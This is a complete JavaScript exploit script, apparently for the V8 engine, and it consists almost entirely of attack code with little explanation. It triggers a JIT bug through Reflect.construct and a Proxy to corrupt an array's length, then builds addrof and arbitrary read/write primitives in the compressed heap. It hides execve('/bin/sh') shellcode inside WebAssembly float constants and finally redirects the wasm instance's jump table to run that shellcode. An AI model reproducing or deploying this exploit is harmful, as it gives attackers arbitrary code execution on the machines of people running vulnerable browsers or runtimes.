/*
 * Helper
 */
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.fhw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.flw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function hex(a) {
    return "0x" + a.toString(16);
}

/*
 * Exploit
 */

threshold = 10000
jitted = false

function f(a, p) {
    a.push(Reflect.construct(function(){}, arguments, p)?4.1835592388585281e-216:0) // itof(0x1337133700010000)
}

let p = new Proxy(Object, {
    get: () => {
        if (jitted) {
            a[0] = {};
            float_rel = [0.1, 1.1, 2.1, 3.1, 4.1];
            float_carw = [6.9];
            uint64_aarw = new BigUint64Array(4);
            obj_leaker = {
                a: float_rel,
                b: a,
            };
            // %DebugPrint(float_rel)
            // readline()
        }
        return Object.prototype;
    }
});

let a;
var float_rel;   // for caged relative read/write primitive
var float_carw;  // for caged arbitrary read/write primitive
var uint64_aarw;
var obj_leaker;  // for addrof primitive

for (let i = 0; i <= threshold; i++) {
    a = [0.1, ,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1]
    a.pop();
    if (i == threshold) {
        jitted = true;
    } 
    f(a, p)
}

console.assert(float_rel.length == (0x10000 >> 1)) // 0x10000 comes from 0x1337133700010000

print("[+] Overwritten float_rel length =", hex(float_rel.length))

function caged_relative_read4(offset) {
    var qw_offset = Math.floor(offset / 2);
    if (offset & 1 == 1) {
        return float_rel[qw_offset].fhw();
    } else {
        return float_rel[qw_offset].flw();
    }
}

function caged_relative_write4(offset, val) {
    var qw_offset = Math.floor(offset / 2);
    if (offset & 1 == 1) {
        let temp = float_rel[qw_offset].flw();
        let new_val = (val << 32n | temp).i2f();
        float_rel[qw_offset] = new_val;
    } else {
        let temp = float_rel[qw_offset].fhw();
        let new_val = (temp << 32n | val).i2f();
        float_rel[qw_offset] = new_val;
    }
}

const float_carw_elements_offset = 0x10;

function caged_arb_read4(caddr) {
    let elements_addr = caddr - 8n | 1n;
    caged_relative_write4(float_carw_elements_offset, elements_addr);
    let res = float_carw[0].flw();
    return res;
}


// This function provides arbitrary within read the compressed heap
function caged_arb_read8(caddr) {
    let elements_addr = caddr - 8n | 1n;
    caged_relative_write4(float_carw_elements_offset, elements_addr);
    let res = float_carw[0].f2i();
    return res;
}

// This function provides arbitrary write within the compressed heap
function caged_arb_write4(caddr, val) {
    let temp = caged_arb_read4(caddr + 4n | 1n);
    let new_val = (temp << 32n | val).i2f();

    let elements_addr = caddr - 8n | 1n;
    caged_relative_write4(float_carw_elements_offset, elements_addr);
    float_carw[0] = new_val;
}

const objleaker_offset = 72;
function addrof(o) {
    obj_leaker.b = o;
    let addr = caged_relative_read4(objleaker_offset) & BigInt(2**32-2);
    obj_leaker.b = {};
    return addr;
}


/*
 * Helper in finding objleaker_offset using output of %DebugPrint(float_rel) and %DebugPrint(a) while in interactive mode
 * Helper in finding float_carw_elements_offset
 */
// for (let j = 0x0; j < 0x80; j+=1) {
//     print(j, " ", hex(caged_relative_read4(j)))
// }

// float_rel_addr = addrof(float_rel)
// float_carw_addr = addrof(float_carw)
// uint64_aarw_addr = addrof(uint64_aarw)
// obj_leaker_addr = addrof(obj_leaker)

// print('addrof(float_rel): ' + hex(float_rel_addr));
// print('addrof(float_carw): ' + hex(float_carw_addr));
// print('addrof(uint64_aarw): ' + hex(uint64_aarw_addr));
// print('addrof(obj_leaker): ' + hex(obj_leaker_addr));

// uint64_aarw[0] = 0x4142434445464748n;
// aarw_els = caged_arb_read4(uint64_aarw_addr+8n)
// print(hex(caged_arb_read8(aarw_els+8n)))
// caged_arb_write4(aarw_els+8n, 0x61626364n)
// print(hex(caged_arb_read8(aarw_els+8n)))
// print(hex(uint64_aarw[0]))

/*
(module
  (func (export "main") (result f64)
  f64.const 1.617548436999262e-270
  f64.const 1.6181477269733566e-270
  f64.const 1.6305238557700824e-270
  f64.const 1.6477681441619941e-270
  f64.const 1.6456891197542608e-270
  f64.const 1.6304734321072042e-270
  f64.const 1.6305242777505848e-270
  drop
  drop
  drop
  drop
  drop
  drop
  )
  (func (export "foo"))
)
*/

var code = new Uint8Array([0,97,115,109,1,0,0,0,1,8,2,96,0,1,124,96,0,0,3,3,2,0,1,7,14,2,4,109,97,105,110,0,0,3,102,111,111,0,1,10,76,2,71,0,68,104,110,47,115,104,88,235,7,68,104,47,98,105,0,91,235,7,68,72,193,224,24,144,144,235,7,68,72,1,216,72,49,219,235,7,68,80,72,137,231,49,210,235,7,68,49,246,106,59,88,144,235,7,68,15,5,144,144,144,144,235,7,26,26,26,26,26,26,11,2,0,11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
var main = instance.exports.main;
for (let j = 0x0; j < 10000; j++) {
    main()
}

instance_addr = addrof(instance)
jump_table_start = instance_addr + 0x48n
rwx_addr = caged_arb_read8(jump_table_start)
sc_addr = rwx_addr + 0x81an - 0x5n
print("[+] Shellcode @", hex(sc_addr+0x5n))

print("[+] Overwriting WasmInstanceObject jump_table_start to point to our shellcode")
caged_arb_write4(jump_table_start, sc_addr & BigInt(2**32-1))

 // to trigger jmp to address pointed by jump_table_start, we need another new function
var foo = instance.exports.foo;
print("[+] Executing shellcode")
foo();
